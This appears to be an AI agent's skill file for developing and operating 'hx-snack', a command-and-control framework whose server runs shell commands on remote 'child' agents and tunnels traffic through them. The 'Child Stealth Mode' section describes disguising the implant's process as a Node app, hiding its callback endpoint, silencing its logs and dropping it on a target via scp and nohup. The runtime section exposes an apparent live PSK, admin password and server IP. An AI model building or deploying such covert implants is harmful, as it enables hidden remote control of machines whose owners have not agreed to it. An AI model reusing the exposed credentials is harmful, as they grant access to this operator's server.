---
name: hx-snack-dev
description: hxの偷吃 C2 framework dev workflow — build, deploy, UI changes, WebSocket pitfalls.
---

# hxの偷吃 (hx-snack) Development

Mother/Child C2 framework at `/root/hx-snack/`. Go project with embedded web UI.

## Project Structure

```
/root/hx-snack/
├── cmd/mother/          # Mother entrypoint
├── cmd/child/           # Child entrypoint
├── internal/mother/     # Hub, API, tunnels, web embed
│   └── web/             # ⚠️ THIS is the embedded copy — go:embed web/*
├── internal/child/      # Agent, monitor
├── internal/protocol/   # Message types, msgpack
├── web/                 # Working copy (NOT embedded — sync to internal/mother/web/)
├── mother               # Compiled binary (running via systemd)
├── mother               # Compiled binary (running via systemd)
├── child-linux-amd64    # Go child binary (served at /dl/child)
└── child.py             # Python child — pure stdlib, zero deps
```

## ⚠️ 10300 Security: iptables Whitelist

Public `:10300` attracts scanners and rogue connections. Lock it down to known child IPs only:

```bash
# Whitelist known child IPs + local access
iptables -I INPUT 1 -p tcp --dport 10300 -s 1.15.226.223 -j ACCEPT   # VM-23-114
iptables -I INPUT 1 -p tcp --dport 10300 -s 198.18.0.0/16 -j ACCEPT  # Chromium cloaking
iptables -I INPUT 1 -p tcp --dport 10300 -s 119.45.171.58 -j ACCEPT  # local (mihomo proxy)
iptables -I INPUT 1 -p tcp --dport 10300 -s 10.10.0.15 -j ACCEPT     # local interface
iptables -I INPUT 1 -p tcp --dport 10300 -s 127.0.0.1 -j ACCEPT      # loopback
# Add REJECT rules for known bad IPs (ESTABLISHED only — blocks existing conns)
iptables -I INPUT 1 -p tcp --dport 10300 -s <BAD_IP> -m conntrack --ctstate ESTABLISHED -j REJECT --reject-with tcp-reset
# Default DROP for everything else
iptables -A INPUT -p tcp --dport 10300 -j DROP
```

**Note**: DROP only affects NEW connections. Already-established connections survive. To kill them:
1. Try `ss -K 'sport = :10300' src <BAD_IP>` 
2. If `ss -K` fails (common), try `conntrack -D -p tcp --dport 10300 -s <BAD_IP>`
3. Nuclear option: `systemctl restart hx-snack-mother` — all connections reset, known children auto-reconnect

## Deploying Arbitrary Files via Mother (Go Embed)

To make any file downloadable at `http://...:10300/<filename>`:

```bash
cp /path/to/file /root/hx-snack/internal/mother/web/
cd /root/hx-snack && go build -o mother ./cmd/mother/ && systemctl restart hx-snack-mother
```

The `//go:embed web/*` directive embeds ALL files in `internal/mother/web/`, not just HTML. Used for `child.py` deployment.

## ⚠️ Critical: HTML Changes

The `//go:embed web/*` directive in `internal/mother/api.go` embeds `internal/mother/web/`, NOT the top-level `web/`.

**After any HTML change:**
```bash
# 1. Copy to embedded location
cp /root/hx-snack/internal/mother/web/index.html /root/hx-snack/web/index.html
# OR reverse if editing /root/hx-snack/web/
cp /root/hx-snack/web/index.html /root/hx-snack/internal/mother/web/index.html

# 2. Rebuild & restart
cd /root/hx-snack && go build -o mother ./cmd/mother/ && systemctl restart hx-snack-mother
```

## Python Child (Zero-Dependency)

`/root/hx-snack/child.py` — pure stdlib Python child, protocol-compatible with Go mother. **No pip install needed** — hand-written msgpack encoder/decoder + WebSocket client + `/proc`-based monitoring.

Use this when the target machine can't install Go or external Python packages. Requires only Python 3.6+.

### Configuration (hardcoded, like Go version)

```python
MOTHER_URL = "ws://<YOUR_HOST>:10300/api/stream"
MOTHER_KEY = "<YOUR_KEY>"
```

### Deploy

```bash
nohup python3 child.py > /dev/null 2>&1 &
```

### Hand-rolled components (no deps)

| Component | Go Version | Python Version |
|-----------|-----------|----------------|
| msgpack | `vmihailenco/msgpack` | Hand-written `_msgpack_pack()` + `_Unpacker` class |
| WebSocket | `gorilla/websocket` | Hand-written `WebSocket` class (handshake + frame + ping/pong) |
| System monitoring | `gopsutil` | `/proc/stat`, `/proc/meminfo`, `/proc/net/dev`, `os.statvfs` |

### Pitfalls

- **Target machines often have no pip**: Never write Python child with external deps. Always pure stdlib.
- msgpack `bin` vs `str`: Go `[]byte` serializes as msgpack `bin` type. Python `_msgpack_pack` must use `bin8/16/32` (`0xc4-0xc6`) for `bytes` objects and `str8/16/32` (`0xd9-0xdb`) / fixstr for `str`. Mixed up → silent data corruption.
- WebSocket client frames MUST be masked. Server frames are unmasked. Hand-rolled `WebSocket.send()` must XOR with random 4-byte mask key.
- Heartbeat uses `random.randint(0,17)` for 8-25s spread → not crypto-random like Go's `crypto/rand`, but adequate for basic OPSEC.
- **⚠️ Byte-order in `send()` frame header**: `struct.pack('BBH', ...)` / `struct.pack('BBQ', ...)` use NATIVE byte order. WebSocket protocol requires big-endian. On x86 (little-endian), frames > 126 bytes have corrupted length → mother rejects with `bad MASK`. **Always use `>BBH` and `>BBQ`** (the `>` prefix forces big-endian). Pong frames already used `>H`/`>Q` correctly — only `send()` had the bug.
- **⚠️ Placeholder values**: `MOTHER_URL` and `MOTHER_KEY` in `child.py` must be replaced before deployment. Forgot to fill them → child silently fails to connect.
- **⚠️ Mother restart frequency**: Each mother restart is logged as `[mother] hxの偷吃 Mother listening on :10300`. 9,983 restarts in 2 days = something is wrong (usually child reconnect storm).
- **Rogue TCP connections**: Unknown IPs can establish TCP to :10300 but never send a valid HTTP/WebSocket handshake. These appear in `ss -tnp | grep 10300` with non-zero `Send-Q` (data sent by remote but not consumed by Go HTTP server). They never reach `HandleWS` — no log entries at all. Common on public-facing ports. Mitigation: iptables allowlist for known child IPs.

### Diagnosing `bad MASK` Storms

Symptom: `mother.err.log` grows to hundreds of MB with endless cycles of:
```
[hub] child xxx connected
[hub] child xxx read error: websocket: bad MASK
[hub] child xxx disconnected
```
(One cycle per millisecond → millions of connections in hours.)

Root cause: the client (Go `gorilla/websocket` or Python hand-rolled) is sending frames that fail the server-side mask check. In `gorilla/websocket`, `ReadMessage()` validates that client→server frames have the MASK bit set with a valid 4-byte masking key.

**Diagnosis commands:**
```bash
# Quick stats
grep -c 'Mother listening' /root/hx-snack/mother.err.log   # restart count
grep -c 'bad MASK' /root/hx-snack/mother.err.log            # error count
grep -c 'child.*registered' /root/hx-snack/mother.err.log   # successful registrations

# Real-time monitor
tail -f /root/hx-snack/mother.err.log | grep --line-buffered -E 'bad MASK|registered|connected'

# Check actual connections (Send-Q = stuck data)
ss -tnp 'sport = :10300'
```

If the child causing `bad MASK` is a Python hand-rolled one, check the byte-order bug above. If it's a Go child, the child binary may be corrupted or built with an incompatible `gorilla/websocket` version.

**"Two flashing simultaneously" pattern**: When `ss` shows two IPs both connecting/disconnecting in lockstep (both `connected` then both `bad MASK` in same millisecond), there are usually two separate clients fighting: one legitimate Go child (VM-23-114) that registers successfully on some attempts, and one broken Python/other child that never registers. The legit one's successful registrations are drowned in the flood. Fix: identify and kill/fix the broken client, then whitelist with iptables.

### Diagnosing Rogue Connections

```bash
# List all external connections to mother
ss -tnp 'sport = :10300' | grep -v '119.45.171\|198.18.0' 

# Send-Q > 0 means data stuck — remote sent something mother can't parse
# Known children should have Send-Q=0 and appear in `lsof -p <mother_pid>`

# Check if an IP has ever registered in logs
grep '<IP>' /root/hx-snack/mother.err.log  # if zero hits, it's a rogue
```

Full protocol wire format and implementation notes: `references/python-child-protocol.md`

## Build

```bash
# Mother
cd /root/hx-snack && go build -o mother ./cmd/mother/

# Child (for download endpoint)
cd /root/hx-snack && GOOS=linux GOARCH=amd64 go build -o child-linux-amd64 ./cmd/child/
```

## Runtime

- **Port**: 10300 (public `http://119.45.171.58:10300/`)
- **PSK**: `hxsnack2026`
- **Systemd**: `hx-snack-mother.service`
- **Admin**: `/admin` login `huanx` / `m1234`
- **Child download**: `GET /dl/child` → serves `child-linux-amd64`

## API Endpoints

| Method | Path | Description |
|--------|------|-------------|
| GET | `/api/children` | List children (with net_rx/net_tx) |
| POST | `/api/tasks` | Submit task `{child_id, command, args, timeout}` |
| GET | `/api/tasks/:id` | Get task result |
| POST | `/api/tunnels` | Create tunnel `{target, listen_port}` (child_id optional — all children if omitted) |
| GET | `/api/tunnels` | List tunnels |
| DELETE | `/api/tunnels/:id` | Close tunnel |
| GET | `/api/stats` | Aggregated stats |
| GET | `/api/events` | SSE stream |
| POST | `/api/login` | Admin auth `{username, password}` → `{token}` |
| GET | `/api/check` | Token validation (Bearer auth) |
| GET | `/ws` | Child WebSocket (legacy) |
| GET | `/api/stream` | Child WebSocket (stealth endpoint) |
| **GET/POST/...** | **`/p/...`** | **HTTP reverse proxy via child nodes (see below)** |

## HTTP Proxy via `/p/` (Zero-Config Reverse Proxy)

**Three URL formats, all supported:**

| Format | Example | Scheme | Default Port |
|--------|---------|--------|-------------|
| `/p/https/<host>/<path>` | `/p/https/new.xinjianya.top/v1/models` | HTTPS | 443 |
| `/p/http/<host>/<path>` | `/p/http/httpbin.org/get` | HTTP | 80 |
| `/p/<host>[:port]/<path>` | `/p/httpbin.org/get` (backward compat) | HTTP | 80 |

`GET/POST /p/[http|https]/<host>/<path>` automatically proxies HTTP(S) requests through a child node. No tunnel creation needed — each request creates a temporary tunnel, proxies the request, and tears down.

**File**: `internal/mother/proxy.go` — `Hub.ProxyHTTP()`, `proxyReader`, `proxyWriter`, `tunnelConn`
**File**: `internal/mother/api.go` — `/p/` handler with scheme detection

### Flow
1. Parse `/p/[http|https]/<target>/<path>` — strip `http/` or `https/` prefix; default port based on scheme
2. Pick any online child via `hub.pickChild()`
3. Open a tunnel stream to `target` (send `tunnel_open`, wait `tunnel_ready` via `registerProxyStream`)
4. If target is `:443`: wrap `tunnelConn` (proxyReader+proxyWriter → `net.Conn`) in `tls.Client`, do TLS handshake with ServerName=hostname
5. Write HTTP(S) request (method, headers, body) through the connection
6. Read HTTP response via `http.ReadResponse` from the buffered connection
7. Copy response (status, headers, body) back to client
8. Clean up: `unregisterProxyStream`

### Usage
```bash
# HTTPS target (recommended)
curl http://119.45.171.58:10300/p/https/new.xinjianya.top/v1/models \
  -H "Authorization: Bearer sk-xxx"

# HTTP target
curl http://119.45.171.58:10300/p/http/httpbin.org/get

# Old format (backward compat, HTTP :80)
curl http://119.45.171.58:10300/p/httpbin.org/get

# POST with body
curl -X POST http://119.45.171.58:10300/p/https/api.openai.com/v1/chat/completions \
  -H "Authorization: Bearer sk-xxx" \
  -H "Content-Type: application/json" \
  -d '{"model":"gpt-4","messages":[{"role":"user","content":"hi"}]}'
```

### Scheme Detection Logic (api.go)
```go
// /p/https/host/path  → useTLS=true,  strip "https/"
// /p/http/host/path   → useTLS=false, strip "http/"
// /p/host/path        → useTLS=false, backward compat (no prefix)
if strings.HasPrefix(path, "http/") {
    path = path[5:]
} else if strings.HasPrefix(path, "https/") {
    useTLS = true
    path = path[6:]
}
```

### Limitation

Supports both HTTP (plaintext) and HTTPS targets. When target ends with `:443`, the proxy automatically performs a TLS handshake (`tls.Client` over `tunnelConn` adapter that wraps `proxyReader`+`proxyWriter` as a `net.Conn`). No special flags needed — just write `:443` in the path.

### Tunnel API: child_id now optional

When `child_id` is omitted from `POST /api/tunnels`, ALL online children are automatically added to the pool:
```bash
curl -X POST http://119.45.171.58:10300/api/tunnels \
  -d '{"target":"httpbin.org:80","listen_port":18080}'
# → 1 child online → 1 tunnel created in pool
# → 5 children online → 5 tunnels, round-robin balanced
```

Implementation: `api.go` handler checks `req.ChildID == ""`, loops `hub.ListChildren()`, calls `OpenTunnel` for each.

See also: `references/proxy-architecture.md` for `/p/` proxy internals, `references/tunnel-architecture.md` for bidirectional tunnel design, `references/debugging-pitfalls.md` for troubleshooting.

## Tunnel Architecture (v2 — Bidirectional + Load Balancing)

Tunnels now support full bidirectional TCP ↔ WS forwarding with round-robin load balancing across multiple children sharing the same port.

### New Components
- **`TunnelPool`**: Groups tunnels sharing a `listen_port`. Has a `listener`, `backends[]`, and round-robin `nextIdx`.
- **`TunnelManager.pools`**: Port → pool map.
- **`Hub.tunnelStreams`**: Map of stream_id → data channel (child→mother tunnel_data).
- **`Hub.tunnelReady`**: Map of stream_id → ready channel (closed when child sends `tunnel_ready`).

### Flow
1. Mother `acceptLoop` gets TCP connection → picks backend via `atomic.AddUint64(&pool.nextIdx, 1) % len(backends)`
2. `handleBidirConn` sends `tunnel_open` to child, waits for `tunnel_ready` (10s timeout)
3. TCP→child: read from conn, send `tunnel_data` via WS
4. Child→TCP: child sends `tunnel_data`, hub dispatches to `tunnelStreams[streamID]`, callback writes to conn

### Adding to a Pool
When `OpenTunnel` is called on an existing port, the new tunnel joins the pool's `backends[]` — no new listener needed. Load balanced automatically.

### Protocol: `tunnel_ready`
New message type `"tunnel_ready"` (defined in `protocol/message.go`). Child sends it after `net.DialTimeout` to target succeeds. Mother's hub handler closes the `tunnelReady[streamID]` channel, unblocking `handleBidirConn`.

### Child Side (`handleTunnel`)
```
1. Dial target
2. Register channel in tunnelStreams
3. Send tunnel_ready → mother
4. Goroutine: target.Read → tunnel_data to mother
5. Main loop: read from channel → write to target
```

## Terminal Modal (index.html)

Click any child row → opens terminal modal with interactive command execution.

**Features:**
- Quick buttons: `uname`, `free`, `df`, `ps`, `who`, `ip`
- Manual command input + Enter to execute
- Output shows stdout, stderr, exit code, duration
- Uses `sh -c` to support pipes and shell syntax
- Polls task result every 500ms up to 15s

**HTML**: Modal in `index.html` before `<script>`, IDs: `terminalModal`, `termTitle`, `termSub`, `cmdInput`, `termOutput`, `quickBtns`.
**JS Functions**: `openTerminal(id, name, ip)`, `closeTerminal()`, `quickCmd(cmd)`, `execCmd()`.
**Child row hover**: `position:relative` + `::after` pseudo-element shows "▶ 点击打开终端".

## Admin Panel — Tunnel Management

Admin page (`/admin`) has tunnel CRUD alongside deploy command:

```html
<select id="tunChild">  <!-- auto-populated from /api/children -->
<input id="tunPort" placeholder="母体端口">
<input id="tunTarget" placeholder="目标 host:port" value="127.0.0.1:22">
```

JS functions: `loadChildren()`, `loadTunnels()`, `createTunnel()`, `deleteTunnel(id)`.
Auto-refreshes on login via `showAdmin()` → `loadTunnels()` + `loadChildren()`.

## Mobile Responsive CSS

Two breakpoints in `index.html`:
- `@media (max-width: 768px)`: Nav hides links, hero title 2.2rem, cards 2-col, table scrollable, tunnels 1-col, quick buttons smaller
- `@media (max-width: 480px)`: Cards 1-col, hero title 1.7rem

## Child Stealth Mode

Child binary supports operational security features to blend into normal server environments. **Final architecture: all config hardcoded at compile time — zero CLI args, zero env vars.**

### Compile-Time Hardcoding (`cmd/child/main.go`)

```go
// Edit these constants before building:
const (
    motherURL = "ws://<YOUR_HOST>:10300/api/stream"
    motherKey = "<YOUR_KEY>"
)
```

Running the binary requires NOTHING — no args, no env vars, no config:
```bash
nohup ./child > /dev/null 2>&1 &
```

### Features

**Process name disguise** — Overwrites `os.Args[0]` memory directly via `reflect.StringHeader`. Hardcoded to `/usr/bin/node /app/server.js`. Result: `ps aux` shows a normal Node app.

**Path disguise** — Connects to `/api/stream` instead of `/ws`. Mother serves both endpoints (same `hub.HandleWS` handler).

**Heartbeat randomization** — Random intervals 8-25s instead of fixed 5s. Uses `crypto/rand` for unpredictability.

**Log silencing** — All `[child] xxx` log messages removed. Only three generic logs remain: `"connected"`, `"connection failed: ..."`, `"tunnel dial error: ..."`, and `"exit: ..."`.

### Deployment on Target

```bash
# Step 1: Edit cmd/child/main.go constants, then build
GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o child ./cmd/child/

# Step 2: Drop and run (zero args)
scp child user@target:/tmp/node
ssh user@target "chmod +x /tmp/node && nohup /tmp/node > /dev/null 2>&1 &"
```

### For Public Repo: Sanitize Before Commit

Before pushing to GitHub, replace real values with placeholders:
```go
const (
    motherURL = "ws://<YOUR_HOST>:10300/api/stream"
    motherKey = "<YOUR_KEY>"
)
```

Also check: `adminPassword` in `api.go` (default `"change-me"`), and the WebUI deploy command in `admin.html` (should use `location.origin`).

## Pitfalls

### Go 1.19: No `min()` builtin
Replace `min(a, b)` with if/else.

### Clipboard over HTTP
`navigator.clipboard.writeText()` requires HTTPS or localhost. Fallback:
```javascript
try { await navigator.clipboard.writeText(text); } catch {
  const ta = document.createElement('textarea');
  ta.value = text; ta.style.position='fixed'; ta.style.left='-9999px';
  document.body.appendChild(ta); ta.select();
  document.execCommand('copy'); document.body.removeChild(ta);
}
```

### JSON Field Casing
- `TunnelInfo` struct has `json:"listen_port"` etc → lowercase in API
- `Tunnel` struct has NO json tags → capitalized (`ListenPort`, `BytesIn`)
- `ChildInfo` has `json:"net_rx"`, `json:"net_tx"` → lowercase in JS (`c.net_rx`)

### Network Data
Child monitor collects `NetRxBytes`/`NetTxBytes` but they must be mapped to `ChildInfo.NetRx`/`NetTx` in `hub.go ListChildren()` to appear in API.

### Two copies of web files
Always check `diff /root/hx-snack/web/index.html /root/hx-snack/internal/mother/web/index.html` if changes don't show up after rebuild.

### Tunnel silently fails if child binary outdated
When adding new protocol message types (like `tunnel_ready`) or modifying `handleTunnel`, the REMOTE child binary must be re-downloaded. Old binaries ignore unknown message types → bidirectional tunnels appear to hang (10s timeout).

### Go HTTP server normalizes `//` in URL paths — FIXED via RequestURI wrapper

`http.ServeMux` collapses `//` to `/` in `r.URL.Path`. To support `/p/https://host/path`, `cmd/mother/main.go` wraps the mux in a `RequestURI`-checking handler that intercepts `/p/http://` and `/p/https://` BEFORE ServeMux cleans the path:

```go
wrapped := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
    uri := r.RequestURI
    if strings.HasPrefix(uri, "/p/http://") || strings.HasPrefix(uri, "/p/https://") {
        // Parse raw URI, extract scheme + host + path
        // Call hub.ProxyHTTP(target, w, r) directly
        return
    }
    mux.ServeHTTP(w, r)
})
```

The in-mux `/p/` handler still supports the path-segment formats (`/p/http/host/path`, `/p/https/host/path`) as backward-compatible alternatives. All three formats work.

### Restart Procedure (Clean)

Avoid accumulated processes from `nohup` restarts. Always kill ALL mother processes first:

```bash
# Kill all mothers and verify
kill $(pgrep mother) 2>/dev/null
sleep 2
ss -tlnp | grep -E '10300|18080' || echo "Ports released"
pgrep mother && echo "⚠️ Residual process!" || echo "Clean"

# Then start
cd /root/hx-snack && nohup ./mother -port 10300 -key hxsnack2026 >> mother.err.log 2>&1 &
```

### ⚠️ mihomo TUN proxy intercepts external IP locally

Server runs mihomo TUN proxy (interface `tun0`, route `198.18.0.1/30`). From the local server, connections to `119.45.171.58` get intercepted by the TUN proxy and routed out through the VPN — they never reach the local listener on `*:<port>`.

**Always use internal IP for local testing:**
```bash
# ✅ Works from local server
curl http://127.0.0.1:18080/...
curl http://10.10.0.15:18080/...

# ❌ Silent failure from local server (TUN intercept)
curl http://119.45.171.58:18080/...
```

External clients connecting to `119.45.171.58` work fine — only the local server itself is affected.

### Child reconnects with new ID after mother restart

When mother restarts, the child reconnects and gets a new random child ID. Any tunnels created with the old child ID become stale — `handleBidirConn` fails the child lookup silently. Always query `/api/children` after restart to get the fresh ID.

### GitHub push from server — use SSH, NOT HTTPS over proxy

**SSH works**. HTTPS push through mihomo proxy fails with HTTP 408 even when `git config http.proxy` is set. Use SSH remote:

```bash
# Switch to SSH remote (one-time)
git remote set-url origin git@github.com:huanxherta/hx-snack.git

# Push (SSH doesn't go through proxy → works directly)
git push origin main
```

If the remote is HTTPS and you need to push urgently, switch to SSH first. Don't waste time debugging proxy for git HTTPS push.

### Child reconnects with new ID after mother restart

When mother restarts, the child reconnects and gets a new random child ID. Any tunnels created with the old child ID become stale — `handleBidirConn` fails the child lookup silently. Always query `/api/children` after restart to get the fresh ID.

### `/p/` proxy returns 503 "no children online" right after restart

After mother restart, the child takes 5-10 seconds to reconnect. `/p/` requests during this window get `503 no children online`. Wait for the child to appear in `/api/children` before using `/p/`.

### Debugging silent tunnel failures

`handleBidirConn` returns silently on timeout/error with no log output. Add debug logging in `/root/hx-snack/internal/mother/tunnel.go`:

```go
log.Printf("[tunnel] bidir: %s starting, child=%s target=%s", streamID, t.ChildID, t.Target)
log.Printf("[tunnel] bidir: %s registered stream", streamID)
log.Printf("[tunnel] bidir: %s sent tunnel_open, waiting ready...", streamID)
log.Printf("[tunnel] bidir: %s timeout waiting ready", streamID)  // timeout case
log.Printf("[tunnel] bidir: %s ready!", streamID)                 // success case
log.Printf("[tunnel] bidir: child %s not found", t.ChildID)      // lookup failure
```

Monitor: `tail -f /root/hx-snack/mother.err.log | grep "bidir"`

Full debugging checklist: see `references/debugging-pitfalls.md`.

## Reverse Proxy — Client Usage

Two methods: **`/p/`** for instant HTTP proxying, or **tunnel API** for persistent TCP forwarding (supports HTTPS).

### Method 1: `/p/` HTTP(S) Proxy (simplest)

```bash
# New format (recommended): explicit scheme
curl http://119.45.171.58:10300/p/https/new.xinjianya.top/v1/models -H "Authorization: Bearer sk-xxx"
curl http://119.45.171.58:10300/p/http/httpbin.org/get

# Old format (backward compat): host:port or just host
curl http://119.45.171.58:10300/p/httpbin.org/get
curl http://119.45.171.58:10300/p/new.xinjianya.top:443/v1/models -H "Authorization: Bearer sk-xxx"

# POST
curl -X POST http://119.45.171.58:10300/p/https/api.example.com/v1/chat/completions \
  -H "Authorization: Bearer sk-xxx" -d '{"model":"gpt-4","messages":[{"role":"user","content":"hi"}]}'
```

### Method 2: Tunnel API (persistent, supports HTTPS)

Tunnels are L4 TCP forwarding (not HTTP proxy). Create once, use repeatedly.

### Create a tunnel

```bash
# Via API (child_id optional — omitting adds all online children)
curl -X POST http://119.45.171.58:10300/api/tunnels \
  -H "Content-Type: application/json" \
  -d '{"target":"api.example.com:443","listen_port":18080}'

# With specific child
curl -X POST http://119.45.171.58:10300/api/tunnels \
  -H "Content-Type: application/json" \
  -d '{"child_id":"<child_id>","target":"api.example.com:443","listen_port":18080}'

# Or via admin panel: /admin → tunnel tab → select child (or none for all), port, target
```

### HTTP (plaintext) targets

```bash
# Target is example.com:80, tunnel on port 18080
curl -H "Host: example.com" http://119.45.171.58:18080/api/endpoint

# POST with JSON
curl -X POST http://119.45.171.58:18080/v1/chat \
  -H "Host: api.example.com" \
  -H "Content-Type: application/json" \
  -d '{"msg":"hello"}'
```

### HTTPS targets

```bash
# TLS SNI is set by curl, tunnel is transparent
# Use --resolve to map domain to mother's IP but keep the tunnel port
curl --resolve "api.example.com:443:119.45.171.58" \
  https://api.example.com:18080/api/endpoint

# Alternative: --connect-to (curl 7.49+)
curl --connect-to "api.example.com:443:119.45.171.58:18080" \
  https://api.example.com/api/endpoint
```

### Key points

- **Host header matters** for HTTP — target server uses it for virtual hosting
- **TLS SNI matters** for HTTPS — set by curl based on the URL hostname, not the IP
- Tunnel is transparent TCP; all headers, TLS handshake pass through unmodified
- Multiple children on the same port → round-robin load balanced automatically
- Different children = different ports if you need to pin requests to a specific child
- **Local testing**: Use `127.0.0.1` or `10.10.0.15` (NOT `119.45.171.58` — TUN proxy intercept). See Pitfalls above.

### Section indentation in Go
When patching Go files inside `case` blocks, watch for messed-up indentation — `sed` won't preserve tabs correctly. Use `patch` tool with `\t` for tab characters.